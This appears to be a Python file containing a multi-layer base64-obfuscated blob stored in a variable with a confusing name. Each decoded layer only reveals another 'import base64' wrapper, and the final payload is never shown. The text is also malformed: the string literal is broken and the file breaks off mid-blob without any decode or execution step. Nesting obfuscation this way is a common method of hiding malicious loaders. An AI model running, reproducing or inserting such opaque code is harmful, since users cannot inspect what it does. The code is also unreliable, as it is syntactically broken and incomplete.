import base64
oOO0oooOO = "import base64
oOO0oooOO = "aW1wb3J0IGJhc2U2NApvT08wb29vT08gPSAiYVcxd2IzSjBJR0poYzJVMk5BcHZUMDh3YjI5dlQwOGdQU0FpWVZjeGQySXpTakJKUjBwb1l6SlZNazVCY0haVU1EaDNZakk1ZGxRd09HZFFVMEZwVjBSRk5XUXlWbGhTYm14cFZucHNOVmRFUlRSaU1XZDRUMWhXV2xaNlJuTlhSRVUwWXpCc1NGTlhOVmxUUjJONlYyMTRORTVHY0VWUmJVNXNVa2RvY1ZkRmFHNU5helZIWlVSU1RtRnNjR3BhVlZKU1pWWm9TV0ZIZEU5aVNHY3dWRlZTUjFreVZrVlRiV2haVTBka05sZHJXalJPUm5CMFZtMU9iRkpIYUhCWFJXaHZZVVV4UjJWRVVtRmlWWEJxV2xWU1FrMHhhRWxoUjJ4UFVtNW5NRmRZY0ZOWk1sWklWMVJDV1ZOSFpEVlViRm8wVGtVMVJWRnRUbXhTUjNNd1YwVm9iMkpWTlZkbFJGSlFWa1UxYWxwVlVtRmlWbWhKWVVkd1drMVlaekJVVlZKWFdUSldTRmR0TVZsVFIyaHpWRlJHTkU1R2NFaFhiVTVzVWpGR00xZEZhRzloVm14elpVUlNVRll4V21wYVZXUk9UVEZvU1dGSGFHRlNibWN3VjFaU2Exa3lWa1ZVVkZKWlUwZGplbFJWV2pST1JuQllVbTFPYkZKSGVHOVhSV2h1VFVVMWMyVkVVazVOYTNCcVdsVmtWbVZXYUVsYWVrNWFWbTVuTUZSV1pFdFpNbFpJVjIweFdWTkhaRFJVTUZvMFRrWndSVlJ0VG14U01GVjNWMFZvYjJGRk1WZGxSRkpPWVcxb2FscFZVbXBOVm1oSlducEtVRlp1WnpCWGJGSmhXVEpXUlZaVVJsbFRSMk42VjFkNE5FNUdiRFphUjA1c1VrWmFjRmRGYUc5aE1YQlhaVVJTVDJGc2NHcGFWVkpoWVZab1NXRkhhRnBOV0djd1ZHNXdhMWt5VmtoVWJXeFpVMGRqZWxScldqUk9SVGxWV2tkT2JGSkZXbk5YUldodVRURnJlR1ZFVWs1U1IzaHFXbFZTUW1WR2FFbGhSM1JPWWtobk1GZHNVbUZaTWxaSVZGaHNXVk5IWTNsWFZsbzBUa1p3UlZkdFRteFNNVXB2VjBWb2JtUXdPVWRsUkZKT1VqQmFhbHBWVWtkaVZtaEpXak5vVDFadVp6QlhhMlJIV1RKV1NGVnRkRmxUUjJoeFZHeGFORTVGTVRaYVIwNXNVakF4TmxkRmFHNWtNREZYWlVSU1QxSkZXbXBhVldSSFlURm9TVnA2UWxwV2JtY3dWR3RrVTFreVZraFVWRlpaVTBkamVsUnFSalJPUlRGRllVZE9iRkpIZEROWFJXaHVaVVUwZUdWRVVrOWhhM0JxV2xWa1lXRXhhRWxhZWtKYVZtNW5NRlF3WkdGWk1sWklVMjFvV1ZOSGFIQlViRm8wVGtVeFNGUnRUbXhTUjAxNlYwVm9iazFGTlVkbFJGSmhZV3MxYWxwVlVrWmtNV2hKV25wT1drMVlaekJVYkdSUFdUSldSVlJZYkZsVFIyaDBWMVphTkU1Rk1VVlViVTVzVWpGck1GZEZhRzloUlRWelpVUlNZVlpGU21wYVZWSkNUVlpvU1ZvemJGcE5XR2N3VjFaa1Uxa3lWa1ZWVkZKWlUwZG9kRlF3V2pST1JuQnhZa2RPYkZJd2EzaFhSV2h2WVRBMGVHVkVVazlTUmtwcVdsVlNTazB4YUVsaFIyeFBUVmhuTUZSdGNFTlpNbFpGWVhwQ1dWTkhaRFZVYkZvMFRrVXhTRlZ0VG14U01GVjRWMFZvYm1WR2NITmxSRkpPVWtaS2FscFZVbTloYkdoSlducEdUMVp1WnpCVVYzQnZXVEpXU0ZWWWNGbFRSMmh5VkRCYU5FNUZNVmhVYlU1c1VrVkZlRmRGYUc5aVZUVnpaVVJTWVdKV2NHcGFWVkpIWVRGb1NWb3phRkJTYm1jd1ZEQmtZVmt5VmtoU2JXeFpVMGRqZVZReFdqUk9SbkJWWVVkT2JGSXdWWGRYUldodllWVTFSMlZFVW1GV01VcHFXbFZTYTJGR2FFbGFla3BoVW01bk1GUnFTbE5aTWxaRllYcE9XVk5IYUc5WFZsbzBUa1pzY1ZGdFRteFNNR3cwVjBWb2IyRnJOWE5sUkZKYVpXMW9hbHBWVWtOaFJtaEpZVWQwVDJKSVp6QlVNV1JQV1RKV1NGTllhRmxUUjJoeVYyMTRORTVHY0hGVmJVNXNVakZhY2xkRmFHNWxhemxIWlVSU1dtRnRlR3BhVldSTFlrWm9TVnA2VW1GaVNHY3dWR3hTUTFreVZrVlNXR3haVTBkb2IxUldXalJPUm14WVZHMU9iRkpHY0hCWFJXaHVUa1UxYzJWRVVtRmhhM0JxV2xWU1ZtVldhRWxhTTJSaFlraG5NRlF4WkZkWk1sWkZXak5rV1ZOSFkzaFVha1kwVGtVMVJWcEhUbXhTTVhCd1YwVm9ibVZzY0hObFJGSlFVakJ3YWxwVlVtcGxWbWhKV2pOd1VGSnVaekJYYlhCUFdUSldTRk5VVGxsVFIyTjVWMWQ0TkU1Rk5YRmhSMDVzVWpCcmVGZEZhRzVOVlRGelpVUlNZV0pXY0dwYVZXUmhZa1pvU1ZwNlFscGlTR2N3VkZod1Ixa3lWa2hUYlhCWlUwZGpkMWRVUmpST1JURlZZa2RPYkZKR1JqTlhSV2h1VFd4d1YyVkVVazlTUmtwcVdsVmtWbVZXYUVsaFIzUk9WbTVuTUZkclVrTlpNbFpJVTIxb1dWTkhhSE5VVlZvMFRrVTFObFJ0VG14U01VVjVWMFZvYjJFeGNITmxSRkpQWld0YWFscFZVbHBOUm1oSlducE9UMDFZWnpCWGJGSkxXVEpXUlZWdGJGbFRSMmh2VkRCYU5FNUZOWEZpUjA1c1VqQnJlbGRGYUc1TlJuQlhaVVJTV21GdGVHcGFWV1JXVGtab1NWcDZRbUZXYm1jd1YxWmtZVmt5VmtWVVZFSlpVMGRrTmxSV1dqUk9SVFUyWVVkT2JGSkZiRFJYUldodllURndSMlZFVW1GU1JWcHFXbFZTVWsxc2FFbGFlazVQVW01bk1GZFhNVWRaTWxaRlZsaG9XVk5IWXpCVVZFWTBUa1pyZVZOdFRteFNSVlYzVjBWb2JrNUdjRmRsUkZKT1RXdHdhbHBWWkU5aVZtaEpXbnBLWVdKSVp6QlVNVkp2V1RKV1NGTlVSbGxUUjJONFZGUkdORTVGTUhsWGJVNXNVakZ3Y1ZkRmFHNWxiSEJIWlVSU1lWWkdTbXBhVlZKT1RXeG9TVnA2Vms1TldHY3dWMVJLVjFreVZraFZiWGhaVTBkak1GZFVSalJPUlRVMllVZE9iRkpIWTNsWFJXaHVUbFU1UjJWRVVsQlNNRFZxV2xWU1FrNVdhRWxhTTJ4UFZtNW5NRmRzVW5OWk1sWkZVMWhzV1ZOSGFIRlVWbG8wVGtad1ZWWnRUbXhTUmtZMlYwVm9iMkZWTkhobFJGSlFWa1ZLYWxwVlVrOWlWbWhKV2pOd1RrMVlaekJVTUdSVFdUSldTRlZ0ZUZsVFIyaHdWMnRhTkU1Rk1IbFhiVTVzVWpGc00xZEZhRzVOTURCNFpVUlNUMkZzV21wYVZWSkdUV3hvU1ZwNlNscGlTR2N3VkRCa1Yxa3lWa2hTV0doWlUwZG9iMWR0ZURST1JURlZVbTFPYkZKRlduTlhSV2h2WVdzd2VHVkVVbHBsYXpWcVdsVlNUazFHYUVsYU0yaGhWbTVuTUZSc1VrZFpNbFpJVTFSR1dWTkhZM2hVVlZvMFRrVTFWV0pIVG14U1JrVjZWMFZvYjJKRk1YTmxSRkpQVmtaYWFscFZVbGRoUm1oSlducE9VRlp1WnpCVVZsSmhXVEpXUlZGdGJGbFRSMk13VkRGYU5FNUZPVlZYYlU1c1VqQnNNMWRGYUc5aFJUVlhaVVJTWVZKSFVtcGFWVkpXVFVab1NWcDZSazlOV0djd1YyMXdVMWt5VmtoVWJXaFpVMGRqZUZSc1dqUk9SVEZZVW0xT2JGSkZWWGRYUldodllWVTBlR1ZFVWs1bGF6VnFXbFZTVG1WV2FFbGFlazVhWWtobk1GZFljR0ZaTWxaRllVZDRXVk5IYUhGVU1WbzBUa1UxTmxwSFRteFNNR3N3VjBWb2IyRnNjRmRsUkZKUFVrVTFhbHBWVW1GaFZtaEpZVWQ0V21KSVp6QlVWbVJIV1RKV1NGUlVSbGxUUjJodlYyeGFORTVGTlRaU2JVNXNVakZ3Y2xkRmFHOWlSbkJYWlVSU1QxSkZXbXBhVlZKS1RURm9TVnA2Vms5V2JtY3dWRlpTYzFreVZrVmlSM0JaVTBkb2IxUnNXalJPUlRSNVZtMU9iRkpGTURGWFJXaHZZVVp3VjJWRVVrNVNSM2hxV2xWU1lXRXhhRWxhTTJST1lraG5NRlJxU2tkWk1sWkZVbFJPV1ZOSFkzaFVhMW8wVGtVMVZXSkhUbXhTTVZZelYwVm9ibVZWT1ZkbFJGSlBWa1phYWxwVlVtdGhWbWhKV2pOc1dsWnVaekJVVkVwWFdUSldSV0V6YkZsVFIyUTJWREZhTkU1Rk9VaFViVTVzVWpCd2RGZEZhRzVOYkhCSFpVUlNUMDFyV21wYVZXUlRZa1pvU1ZvemFGQldibWN3Vkcxd2Mxa3lWa1ZYVkZKWlUwZGtORlJWV2pST1JURnhVbTFPYkZKSFpEWlhSV2h2WVRBd2VHVkVVazVXTVhCcVdsVmtWbVZzYUVsYWVsSk9UVmhuTUZSWGNHRlpNbFpJVkcxNFdWTkhZekJVTVZvMFRrWnNXRlp0VG14U01HdzBWMFZvYjJGck9VZGxSRkpRVWpGd2FscFZaRmRpUm1oSllVZG9UazFZWnpCVVdIQkxXVEpXUlZWVVNsbFRSMk4zVjFaYU5FNUdjRmhWYlU1c1VqRkdOVmRGYUc1TmF6RlhaVVJTVUZJd1dtcGFWVkphWlVab1NWcDZVbUZpU0djd1YxY3hZVmt5VmtWVldIQlpVMGRqZDFkVVJqUk9SVEZJVjIxT2JGSXdjSE5YUldodVpVVXhjMlZFVW1GU1IyaHFXbFZrUzJFeGFFbGFlbEpPWWtobk1GUnRjRXRaTWxaRlVXMTBXVk5IWXpGVVZFWTBUa1UxVlZOdFRteFNSVEI0VjBWb2JrMXNiSE5sUkZKUVVrZG9hbHBWVWtwbFZtaEpXbnBPVG1KSVp6QlhiRkpEV1RKV1JWTnRNVmxUUjJOM1ZGUkdORTVHYTNsWGJVNXNVa2RvZEZkRmFHNWxWVGxIWlVSU1dsWkZOV3BhVlZKU1pXeG9TVnA2UmxCU2JtY3dWMWh3VDFreVZrVlVWRkpaVTBkb2NsZHNXalJPUlRGVlZHMU9iRkl4YTNoWFJXaHVUVVp3YzJWRVVrOVdSVnBxV2xWU2NtVldhRWxhZWtwUFZtNW5NRmRXVWxkWk1sWklWMjEwV1ZOSFpEVlhWM2cwVGtVNVNGTnRUbXhTTVVweFYwVm9iazFWTlhObFJGSlBaV3RhYWxwVlVtOWhWbWhKV25wQ1lWWnVaekJYVjNCTFdUSldTRkp0TVZsVFIyaHpWR3RhTkU1Rk1UWlZiVTVzVWtkU2RGZEZhRzVPUm5CWFpVUlNUMlZzU21wYVZWSlNUVVpvU1dGSE1WQlNibWN3VkZod1Mxa3lWa2hVVkZaWlUwZGplVlF4V2pST1JteFlWRzFPYkZJeFJUQlhSV2h1WlZVMWMyVkVVbUZTUjNocVdsVlNVbVZHYUVsaFIyaFBWbTVuTUZSdWNHOVpNbFpGVjFST1dWTkhaRFJVYkZvMFRrWnNXRlp0VG14U01WVjNWMFZvYjJGck1YTmxSRkpPWlcxU2FscFZaRkprTVdoSldqTnNUMVp1WnpCVWExSkhXVEpXUldKSGNGbFRSMmh5VkRCYU5FNUdiSEZpUjA1c1VqRkZkMWRGYUc1T1JtdDRaVVJTV21Wc2NHcGFWVkpoWWtab1NWb3piR0ZpU0djd1ZGWlNZVmt5VmtWWGJXeFpVMGRrTmxkV1dqUk9SVEUyV2tkT2JGSkZTbkZYUldodVpWVTFWMlZFVWs5U1IxSnFXbFZTUmsweGFFbGFNMnhQVW01bk1GUXdVbUZaTWxaSVYxaHdXVk5IWXpCVWExbzBUa1pzV0ZkdFRteFNSbXcyVjBWb2JrMVZOVWRsUkZKYVlXMVNhbHBWVWt0aVZtaEpXbnBDV21KSVp6QlhWRXBMV1RKV1JWRlVSbGxUUjJodlZERmFORTVGTlhGVmJVNXNVakZLYjFkRmFHNWtNRGxYWlVSU1drMXJjR3BhVlZKdVpWWm9TVm96Y0ZwaVNHY3dWMWh3WVZreVZrVlNiWFJaVTBkb2MxZHRlRFJPUlRGVlZtMU9iRkpHY0c5WFJXaHVUVEF4VjJWRVVtRlNSWEJxV2xWa1JrMUdhRWxhTTJ4aFZtNW5NRmRXVWxkWk1sWklVbFJDV1ZOSFkzbFhiWGcwVGtVeGNWTnRUbXhTUmtZMVYwVm9iazFWTVVkbFJGSlFWa2RTYWxwVlVrdGlWbWhKV25wU1VGSnVaekJVYkdSSFdUSldSVlZVU2xsVFIyaHZWRlZhTkU1R2NGaFNiVTVzVWtWd2NsZEZhRzVOUlRGelpVUlNVRll3Y0dwYVZWSnlUV3hvU1ZwNlRscE5XR2N3VjJ0a1Yxa3lWa2hTYlhoWlUwZGplbGR0ZURST1JURlZWVzFPYkZKSFVuTlhSV2h1VFRBMVYyVkVVbEJXTUhCcVdsVlNVMkZzYUVsaFJ6RmhWbTVuTUZSc1VsZFpNbFpGVWxST1dWTkhZM3BVYlhnMFRrWnNXRlZ0VG14U1JsWTBWMFZvYmsxc2NFZGxSRkpRVWtaYWFscFZVbTloYkdoSldqTndVRkp1WnpCWGJGSkRXVEpXU0ZaVVVsbFRSMk40VjFaYU5FNUZNVmhXYlU1c1VrZGplRmRGYUc1TlJURnpaVVJTVDFJd05XcGFWVkpQWVd4b1NXRkhiRTlOV0djd1ZGVlNjMWt5VmtWVGJXeFpVMGRvZEZRd1dqUk9SVEYwVW0xT2JGSkhaRFJYUldodllsVTBlR1ZFVW1GU01VcHFXbFZTVms1V2FFbGFNMnhRVW01bk1GUnRjRmRaTWxaRllVZDBXVk5IYUhSVVZFWTBUa1UxZEZadFRteFNNRlkxVjBWb2JrMXJOSGhsUkZKT1RXeGFhbHBWVWs1bFZtaEpXak5rVUZKdVp6QlhWbEpUV1RKV1JWcDZWbGxUUjJoelYxUkdORTVGTVhGVGJVNXNVakF3ZWxkRmFHNWtNWEJYWlVSU1lWSkhVbXBhVlZKT1RURm9TV0ZIYkU1V2JtY3dWMnhrVDFreVZrVlRWRlpaVTBkb2NGUlVSalJPUm10NVZtMU9iRkpHYkRaWFJXaHVUbFUxUjJWRVVrNU5iRnBxV2xWU2JtVnNhRWxoUjJoT1RWaG5NRmRZY0c5Wk1sWkZWRzF3V1ZOSFkzZFhWM2cwVGtVNVJWVnRUbXhTUjA0MVYwVm9iazFXYTNobFJGSmFZV3RLYWxwVlVtdGhWbWhKV25wT1QwMVlaekJVVlZKaFdUSldSVmt6YUZsVFIyUTFWMVJHTkU1R2NGVlRiVTVzVWtkU2RGZEZhRzVOUlRCNFpVUlNXazFyY0dwYVZWSldUV3hvU1dGSGRHRlNibWN3VkRCa1Uxa3lWa2hUVkVaWlUwZGplRmR0ZURST1JURTJWRzFPYkZKRlJqTlhSV2h1WkRBMGVHVkVVazVpVmxwcVdsVmtVMkZHYUVsYWVrSmFWbTVuTUZSWWNFdFpNbFpJVjFSQ1dWTkhhSEpVTVZvMFRrWndSVkZ0VG14U1JrWXpWMFZvYjJGck5VZGxSRkpPWVd4YWFscFZaRk5pUm1oSllVZG9UMDFZWnpCWFdIQnJXVEpXUldKSGRGbFRSMlExVkRGYU5FNUZNVlZVYlU1c1VrVlZNRmRGYUc1bGF6RnpaVVJTWVdKVldtcGFWVkpTWkRGb1NWcDZUbEJTYm1jd1YxWlNiMWt5VmtoWGJYQlpVMGRrTlZSVVJqUk9SVEYwVm0xT2JGSXhXbkpYUldodVpEQXhSMlZFVWs1U1JscHFXbFZTVjJKR2FFbGhSekZhWWtobk1GUlZVa3RaTWxaRldUTm9XVk5IWkRSWGJGbzBUa1p3Y1ZKdFRteFNSVVY1VjBWb2JtVnNhM2hsUkZKUFpXeGFhbHBWVWtwTlZtaEpXbnBPVDAxWVp6QlVWVkpIV1RKV1JWUlVWbGxUUjJod1ZGZDRORTVGTVVWV2JVNXNVakJWZDFkRmFHNWxWbkJYWlVSU1QySldXbXBhVlZKUFlVWm9TVm96Y0dGU2JtY3dWR3RrWVZreVZrVmhSMnhaVTBka00xUlZXalJPUlRWMFZHMU9iRkl3Y0hCWFJXaHVUVVp3VjJWRVVtRldSM2hxV2xWa1RrMVdhRWxoUjNCYVZtNW5NRlJXWkU5Wk1sWkZXbnBDV1ZOSFl6RlVWRVkwVGtac2NWcEhUbXhTUm1zd1YwVm9ibVZWTlZkbFJGSlFVa1ZLYWxwVlVtNWxiR2hKV25wT1QxSnVaekJYYkZKaFdUSldSVkpVVWxsVFIyTjVWR3BHTkU1Rk5VaFRiVTVzVWtaVmVWZEZhRzlpUlRGWFpVUlNUbFpIYUdwYVZWSnlUa1pvU1dGSGJGQldibWN3VjFaU1Mxa3lWa2hXVkZaWlUwZG9jRlJXV2pST1JUVnhWbTFPYkZJd05YTlhSV2h1VFZacmVHVkVVazVpVlZwcVdsVlNTazB4YUVsYWVrSk9Za2huTUZSdWNGTlpNbFpGVWxST1dWTkhZM2hYVmxvMFRrVTVWV0ZIVG14U1IzTjVWMFZvYjJGV2NITmxSRkpQWVcxb2FscFZVbTVPUm1oSllVY3hZVlp1WnpCVVYzQmhXVEpXUlZGWWFGbFRSMk42Vkd0YU5FNUdhM2xWYlU1c1VqQTFiMWRGYUc1T1ZUVkhaVVJTWVZKR1dtcGFWVkp6WWtab1NXRkhjRkJTYm1jd1ZHNXdhMWt5VmtWVGJXaFpVMGRvY0ZSVVJqUk9SVEZ4VW0xT2JGSkZNVFZYUldodVRURnJlR1ZFVWs1U1JrcHFXbFZTUWsxV2FFbGFNMmhoVm01bk1GUXdaRTlaTWxaRlVWUkNXVk5IWkRSVVZsbzBUa1V4Y1ZadFRteFNNRFZ3VjBWb2JrMXJNVWRsUkZKT1pXdHdhbHBWWkVaT1JtaEpZVWRzVDAxWVp6QlVXSEJyV1RKV1NGVnRhRmxUUjJNeFZGZDRORTVGTlZWaFIwNXNVakZGTUZkRmFHNWxWbXQ0WlVSU1dtSldXbXBhVlZKcVpXeG9TV0ZIZEU1TldHY3dWREJTWVZreVZraFNWRTVaVTBka00xUXhXalJPUm14eFZXMU9iRkl3Y0hGWFJXaHZZVVV4YzJWRVVrOWxiRXBxV2xWa1dtVkdhRWxoUjJoaFlraG5NRmRXVWtkWk1sWkZVVzE0V1ZOSFpEVlVWRVkwVGtVMWNXSkhUbXhTUlRWMFYwVm9iazFzY0VkbFJGSmhWakZLYWxwVlpGSk5NV2hKV25wV1VGSnVaekJVVmxKRFdUSldSVlp0ZEZsVFIyUTJWMVJHTkU1Rk5YRmlSMDVzVWtaV05GZEZhRzlpVm5CWFpVUlNUMkpWV21wYVZXUmFUa1pvU1ZvemNFNWlTR2N3VkRCU1Yxa3lWa2hYVkZaWlUwZG9kRlF4V2pST1JURllVMjFPYkZKRlduSlhSV2h2WVZacmVHVkVVbEJTUjJocVdsVlNWMkpXYUVsYWVrNVBVbTVuTUZSdGNFOVpNbFpGV1ROa1dWTkhaRE5YYlhnMFRrVTFkRlp0VG14U01VVjRWMFZvYm1WRk1IaGxSRkpQVFd4YWFscFZVbTVOUm1oSldqTnNVRlp1WnpCWFZtUlBXVEpXUldGNlFsbFRSMlEyVjFSR05FNUdjSEZoUjA1c1VrVTFjVmRGYUc1bGF6QjRaVVJTVDJGc1NtcGFWVkp2WWtab1NXRkhjR0ZXYm1jd1ZHNXdTMWt5VmtWVGJYaFpVMGRqTUZReFdqUk9SVGxWWWtkT2JGSkdSVEZYUldodVpWWndWMlZFVWxwaGJXaHFXbFZTUjJGV2FFbGhSM1JhVFZobk1GZHRjRXRaTWxaSVUxaGtXVk5IYUc5WGExbzBUa1pyZVZKdFRteFNSa1V4VjBWb2JrMVZOSGhsUkZKUVVrWkthbHBWVWxKbGJHaEpXbnBXWVZadVp6QlhiR1JIV1RKV1JWVlljRmxUUjJoMFZHeGFORTVGT1VWVWJVNXNVakJ3Y0ZkRmFHNU9WVGxYWlVSU1QySlZOV3BhVlZKaFlsWm9TVnA2Ums1U2JtY3dWMjF3UjFreVZrVlZXSEJaVTBkamVGUXdXalJPUlRFMlVXMU9iRkpGU25GWFJXaHVUV3h3VjJWRVVscFdSVFZxV2xWU1MyRkdhRWxhTTJST1RWaG5NRmRXWkZOWk1sWklWbTEwV1ZOSFkzaFhiRm8wVGtVeFZWRnRUbXhTUmtwdlYwVm9iazFWTVhObFJGSlBWakJ3YWxwVlVrOWhWbWhKV2pOb1RsWnVaekJYYkZKcldUSldTRlZVVmxsVFIyaHdWMWQ0TkU1Rk5VVlRiVTVzVWpCVk1WZEZhRzVOVm5CWFpVUlNUMkpXY0dwYVZWSnVaVVpvU1ZwNlZtRldibWN3Vkcxd1Uxa3lWa1ZWVkZaWlUwZGpkMVJXV2pST1JuQnhWMjFPYkZKRlZqTlhSV2h2WVZad2MyVkVVazlXUlVwcVdsVlNRazFHYUVsYU0zQk9UVmhuTUZkdGNHdFpNbFpJVW0xb1dWTkhhSEZVTUZvMFRrVXhXRk50VG14U1IzaHpWMFZvYms1Vk1YTmxSRkpQVWpBMWFscFZVa05pUm1oSllVZHdUMDFZWnpCWFZsSkxXVEpXU0ZkVVJsbFRSMmh2VjJ4YU5FNUZOVmhXYlU1c1VqQXdNVmRGYUc1bFZUbFhaVVJTVUZKRmNHcGFWVkpUWVZab1NXRkhkR0ZTYm1jd1ZGWmtZVmt5VmtoVVZFSlpVMGRvY1ZSc1dqUk9SbkJGVm0xT2JGSXdXbkJYUldodVpWVXhjMlZFVWxCV01IQnFXbFZTUjJGR2FFbGhSM2hQVFZobk1GUnNVbGRaTWxaRldUTm9XVk5IWXpGVVZsbzBUa1p3VlZOdFRteFNSbXcxVjBWb2IySkZPVWRsUkZKUVVrWmFhbHBWVWtKT1JtaEpXbnBTWVdKSVp6QlhiRkpEV1RKV1NGSnRjRmxUUjJodlYxWmFORTVHYkZWVWJVNXNVa2RqTUZkRmFHNU5SVEI0WlVSU1RsSkdjR3BhVlZKellsWm9TV0ZIYkdGV2JtY3dWRmh3VjFreVZrVldXR1JaVTBkamVWZHNXalJPUlRWeFlVZE9iRkpHU25CWFJXaHVaVVUxUjJWRVVtRmhhM0JxV2xWU1YyRXhhRWxhZWtwT1RWaG5NRlJZY0d0Wk1sWkZWMjFzV1ZOSFpEUlhWbG8wVGtVMVJWUnRUbXhTTVd0NFYwVm9ibVZHY0hObFJGSlBVakZLYWxwVlVrcE9WbWhKV25wS1lWSnVaekJYYlhCcldUSldTRlZ0YUZsVFIyUTJWMVJHTkU1R2JEWlViVTVzVWtacmQxZEZhRzVPUm10NFpVUlNZVkpGTldwYVZWSkdaV3hvU1ZvemJGQldibWN3VjJ4a1lWa3lWa1ZaZWs1WlUwZGpNRlJVUmpST1JURklWVzFPYkZJd01IbFhSV2h1VGxVNVYyVkVVbUZTTURWcVdsVmtTazVXYUVsYWVrWmFUVmhuTUZSVVNsTlpNbFpGV1hwU1dWTkhhSEZVYkZvMFRrVTFWV0pIVG14U1JXdzBWMFZvYms1Vk1IaGxSRkpPVWpGd2FscFZVazVOYkdoSlducEtZVkp1WnpCVWExSkRXVEpXUlZOVVFsbFRSMmh4VjJ4YU5FNUZNVFpWYlU1c1VrVlZNRmRGYUc1a01XdDRaVVJTVGsxcmNHcGFWV1JoWVd4b1NWb3phRTlOV0djd1ZHeGtVMWt5VmtWWFdIQlpVMGRqZVZkc1dqUk9SVEUyV2tkT2JGSXdNSGRYUldodVRWVXhSMlZFVWs5TmJIQnFXbFZrUzJKV2FFbGhSMnhPWWtobk1GUldaRk5aTWxaSVZWaGtXVk5IWkRSWFZFWTBUa1V4TmxOdFRteFNSV3Q2VjBWb2JrMHhhM2hsUkZKYVlsWkthbHBWWkZOaFZtaEpXbnBTVGxKdVp6QlhWM0JyV1RKV1JWZFVUbGxUUjJoeVYxWmFORTVGTUhsVWJVNXNVa2RqZUZkRmFHNWxhelZIWlVSU1dtRnJTbXBhVlZKU1pXeG9TVnA2VG1GV2JtY3dWREZrVTFreVZrVlpNMlJaVTBka05sUlhlRFJPUlRFMlUyMU9iRkl3TUhkWFJXaHVUVEZzYzJWRVVscFdNVXBxV2xWU1RrMUdhRWxhZWtwaFlraG5NRlF4WkU5Wk1sWkZZVE5vV1ZOSFkzZFVWM2cwVGtVNVZXRkhUbXhTTVZweVYwVm9iazVWTlhObFJGSk9Va1ZLYWxwVlVrWk5SbWhKWVVkc1lWWnVaekJVYkdSWFdUSldTRlJVUmxsVFIyTXhWR3RhTkU1Rk5WaFZiVTVzVWpCd2NGZEZhRzVsYXpsWFpVUlNUbEl4U21wYVZWSk9UVlpvU1dGSE1WQldibWN3VjFaU1Qxa3lWa1ZWYlRGWlUwZGplRmRXV2pST1JUVnhZVWRPYkZJeGNITlhSV2h2WWxVeGMyVkVVbUZXTVZwcVdsVmtWMkV4YUVsYWVrcE9UVmhuTUZSVlVrTlpNbFpGVkZST1dWTkhaRFJVTUZvMFRrWnJlVkp0VG14U01GVjZWMFZvYmswd05VZGxSRkphVmtaYWFscFZVbXBOVm1oSldqTndZV0pJWnpCVVdIQnJXVEpXUlZGVVRsbFRSMmh6VjIxNE5FNUZPVWhYYlU1c1VqQnJNVmRGYUc5aFJURlhaVVJTV21Gc1NtcGFWVkp1Wld4b1NXRkhiRnBpU0djd1YxZHdUMWt5VmtWVlZFNVpVMGRqTUZSVldqUk9SVFUyVW0xT2JGSkdjRzlYUldodVRsVTVWMlZFVWs1U1JscHFXbFZrV2sweGFFbGFNMmhPVW01bk1GUXdaRWRaTWxaRldYcE9XVk5IYUc5VVZWbzBUa1pzY1ZKdFRteFNSbFkxVjBWb2IyRXdNSGhsUkZKaFlXMTRhbHBWVW5KbGJHaEpZVWRvVUZadVp6QlhWM0JUV1RKV1NGWnRlRmxUUjJod1YxWmFORTVGT1VWaVIwNXNVa1pzTTFkRmFHOWhWVEZ6WlVSU1RsSkZjR3BhVlZKT1RXeG9TVm96WkZwTldHY3dWMVpTUTFreVZraFNiWFJaVTBka05GUldXalJPUm13MldrZE9iRkpHYkRSWFJXaHZZVVp3VjJWRVVtRmhiVkpxV2xWa1NrMVdhRWxhTTJoUFRWaG5NRmRZY0VOWk1sWklWVlJDV1ZOSGFITlViWGcwVGtad1dGZHRUbXhTUm10NlYwVm9iazFWTVZkbFJGSmhZVzE0YWxwVlVtOWhiR2hKV2pOd1QxSnVaekJVVjNCRFdUSldSVlZZY0ZsVFIyaHdWRmQ0TkU1R2NFVlZiVTVzVWtWRmQxZEZhRzVsUlRWelpVUlNUMVpHU21wYVZWSnFUVEZvU1dGSGNFOVdibWN3VjFaa1lWa3lWa1ZSVkVKWlUwZGtNMVJxUmpST1JteHhVbTFPYkZJeFNuQlhSV2h1WkRBMVIyVkVVazlTUmtwcVdsVmtSMkV4YUVsYU0yUmhVbTVuTUZSdGNHOVpNbFpGVmxSU1dWTkhhSEZVYkZvMFRrVXhkRkp0VG14U1IyTjNWMFZvYms1Rk1YTmxSRkpQWVd4d2FscFZaRlpPUm1oSllVZDBUMVp1WnpCWFYzQnJXVEpXU0ZKdGJGbFRSMk42VkZSR05FNUZNWEZWYlU1c1VrWnNNMWRGYUc5aFZUVkhaVVJTWVZZeFNtcGFWV1JYWVRGb1NWb3paRTlpU0djd1YxZHdhMWt5VmtoVVZGWlpVMGRrTTFRd1dqUk9SVEI1VlcxT2JGSkdWWGhYUldodVRURndjMlZFVW1GaVZscHFXbFZrU2s1V2FFbGhSM1JPVFZobk1GZHNVbUZaTWxaRlducEtXVk5IYUhKVVZsbzBUa1pzY1dGSFRteFNSMmh6VjBWb2JtVnJOSGhsUkZKUFVrWkthbHBWVWxwTlZtaEpXbnBHV2xadVp6QlVWV1JUV1RKV1NGUlVVbGxUUjJNeFZHMTRORTVHY0ZoU2JVNXNVa1ZXTlZkRmFHOWhhekZIWlVSU1RtVnNjR3BhVldSR1RWWm9TVm96YUdGV2JtY3dWMnhrUzFreVZrVmFla1paVTBkb2MxZHRlRFJPUm5CWVZXMU9iRkpGVlhsWFJXaHVUbFp3UjJWRVVrNWlWbHBxV2xWU1lXRXhhRWxhZWs1T1RWaG5NRmRYY0VOWk1sWkZZVE5vV1ZOSGFISlVWRVkwVGtad1ZXSkhUbXhTTUZZMFYwVm9ibVZGT1VkbFJGSmhZbFphYWxwVlVrWk9WbWhKV25wT1RsSnVaekJVYTJSaFdUSldTRlpZY0ZsVFIyaDBWMnhhTkU1Rk5YRlZiVTVzVWtkTmVsZEZhRzVsVlRWelpVUlNUMUl3V21wYVZXUlNUa1pvU1ZwNlZrOVNibWN3VjIxd2Ixa3lWa2hXVkZaWlUwZG9jbFJxUmpST1JUVklVMjFPYkZKSGFISlhSV2h1WldzeGMyVkVVbHBsYkZwcVdsVmtVMkZHYUVsaFIzQlBWbTVuTUZScVNrOVpNbFpJVlcxb1dWTkhaRFpVVkVZMFRrVTFObE50VG14U1JtdzJWMFZvYjJGck5IaGxSRkphVmtVMWFscFZaRTVOYkdoSlducENUMDFZWnpCVVZsSnpXVEpXUlZSdE1WbFRSMk40VkdwR05FNUZOSGxVYlU1c1VqQmFiMWRGYUc1T1JUVlhaVVJTVGxZd2NHcGFWVkp1WlVab1NWcDZWazlpU0djd1ZGZHdWMWt5VmtWYVIzaFpVMGRqZVZSV1dqUk9SVFI1VjIxT2JGSkdSalZYUldodVRrVTFWMlZFVWs1bGJFcHFXb